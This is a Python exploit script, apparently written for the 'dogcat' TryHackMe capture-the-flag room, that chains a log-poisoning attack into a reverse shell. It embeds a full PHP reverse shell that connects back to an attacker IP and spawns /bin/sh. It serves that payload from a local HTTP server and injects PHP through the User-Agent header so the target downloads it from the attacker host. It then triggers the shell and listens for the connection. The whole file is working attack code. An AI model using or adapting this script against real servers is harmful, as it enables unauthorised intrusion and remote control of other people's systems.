import argparse
import requests
import http.server
import socketserver
import socket
import subprocess
import threading
import time
import os


def generate_php_shell_code(attacker_ip, port=1234):
    ip = str(attacker_ip)
    port = str(port)
    php_shell_code = '''
<?php
set_time_limit(0);
$VERSION = "1.0";
$ip = '%s';
$port = %s;
$chunk_size = 1400;
$write_a = null;
$error_a = null;
$shell = 'uname -a; w; id; /bin/sh -i';
$daemon = 0;
$debug = 0;
if (function_exists('pcntl_fork')) {
    $pid = pcntl_fork();
    if ($pid == -1) {
        printit("ERROR: Can't fork");
        exit(1);
    }
    if ($pid) {
        exit(0);  
    }
    if (posix_setsid() == -1) {
        printit("Error: Can't setsid()");
        exit(1);
    }
    $daemon = 1;
} else {
    printit("WARNING: Failed to daemonise.  This is quite common and not fatal.");
}
chdir("/");
umask(0);
$sock = fsockopen($ip, $port, $errno, $errstr, 30);
if (!$sock) {
    printit("$errstr ($errno)");
    exit(1);
}
$descriptorspec = array(
   0 => array("pipe", "r"),  
   1 => array("pipe", "w"),  
   2 => array("pipe", "w")   
);
$process = proc_open($shell, $descriptorspec, $pipes);
if (!is_resource($process)) {
    printit("ERROR: Can't spawn shell");
    exit(1);
}
stream_set_blocking($pipes[0], 0);
stream_set_blocking($pipes[1], 0);
stream_set_blocking($pipes[2], 0);
stream_set_blocking($sock, 0);
printit("Successfully opened reverse shell to $ip:$port");
while (1) {
    if (feof($sock)) {
        printit("ERROR: Shell connection terminated");
        break;
    }
    if (feof($pipes[1])) {
        printit("ERROR: Shell process terminated");
        break;
    }
    $read_a = array($sock, $pipes[1], $pipes[2]);
    $num_changed_sockets = stream_select($read_a, $write_a, $error_a, null);
    if (in_array($sock, $read_a)) {
        if ($debug) printit("SOCK READ");
        $input = fread($sock, $chunk_size);
        if ($debug) printit("SOCK: $input");
        fwrite($pipes[0], $input);
    }
    if (in_array($pipes[1], $read_a)) {
        if ($debug) printit("STDOUT READ");
        $input = fread($pipes[1], $chunk_size);
        if ($debug) printit("STDOUT: $input");
        fwrite($sock, $input);
    }
    if (in_array($pipes[2], $read_a)) {
        if ($debug) printit("STDERR READ");
        $input = fread($pipes[2], $chunk_size);
        if ($debug) printit("STDERR: $input");
        fwrite($sock, $input);
    }
}
fclose($sock);
fclose($pipes[0]);
fclose($pipes[1]);
fclose($pipes[2]);
proc_close($process);
function printit ($string) {
    if (!$daemon) {
        print "$string\n";
    }
}
?>
''' % (ip, port)
    return php_shell_code


class MyHttpRequestHandler(http.server.SimpleHTTPRequestHandler):
    def __init__(self, *args, **kwargs):
        self.attacker_ip = kwargs.pop('attacker_ip')
        super().__init__(*args, **kwargs)

    def do_GET(self):
        self.send_response(200)
        self.send_header('Content-type', 'text/plain')
        self.end_headers()
        php_shell_code = generate_php_shell_code(self.attacker_ip)
        self.wfile.write(php_shell_code.encode())


def start_http_server():
    os.chdir(os.path.dirname(os.path.abspath(__file__)))
    server = socketserver.TCPServer(('127.0.0.1', 8000), MyHttpRequestHandler)
    print("HTTP server started at http://127.0.0.1:8000/")

    def shutdown_server():
        time.sleep(120)  # Wait for 2 minutes
        server.shutdown()
        return "No GET request received. Shutting down the server."

    # Start a thread to shut down the server after 2 minutes if no GET request received
    threading.Thread(target=shutdown_server).start()

    # Start the server
    server.serve_forever()


def shell_pull(machine_ip, attacker_ip):
    user_agent = "<?php file_put_contents('shell.php',file_get_contents('http://{}/shell.php'))?>".format(attacker_ip)
    headers = {'User-Agent': user_agent}
    response = requests.get(f"http://{machine_ip}", headers=headers)
    return response


def handle_reverse_shell(listen_ip='0.0.0.0', listen_port=1234):
    server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server.bind((listen_ip, listen_port))
    server.listen(1)

    print("Listening for incoming connections...")
    client_socket, client_address = server.accept()
    print("Connection accepted from:", client_address)

    shell = subprocess.Popen(["/bin/sh"], stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.PIPE)

    os.dup2(shell.stdin.fileno(), 0)
    os.dup2(shell.stdout.fileno(), 1)
    os.dup2(shell.stderr.fileno(), 2)

    try:
        while True:
            data = client_socket.recv(1024)
            if len(data) == 0:
                break
            shell.stdin.write(data)
            shell.stdin.flush()
    except Exception as e:
        print("Error:", e)

    shell.terminate()
    client_socket.close()
    server.close()


def main():
    parser = argparse.ArgumentParser(description='Exploit script for dogcat TryHackMe room.')
    parser.add_argument('-s', '--attacker_ip', type=str, help='Attacker\'s IP address', required=True)
    parser.add_argument('-d', '--machine_ip', type=str, help='Target machine\'s IP address', required=True)
    args = parser.parse_args()

    attacker_ip = args.attacker_ip
    machine_ip = args.machine_ip

    # Start HTTP server in a thread
    http_server_thread = threading.Thread(target=start_http_server)
    http_server_thread.start()

    # Pull PHP shell
    response = shell_pull(machine_ip, attacker_ip)
    if response.status_code == 200:
        print("Successfully pulled PHP shell.")
    else:
        print("Failed to pull PHP shell.")
        return

    # Connect to shell
    print("Connecting to shell...")
    listener_thread = threading.Thread(target=handle_reverse_shell)
    listener_thread.start()

    # Send request after a delay
    time.sleep(5)  # Adjust the delay as needed
    requests.get(f'http://{machine_ip}/shell.php')
    print("Request sent")


if __name__ == "__main__":
    main()
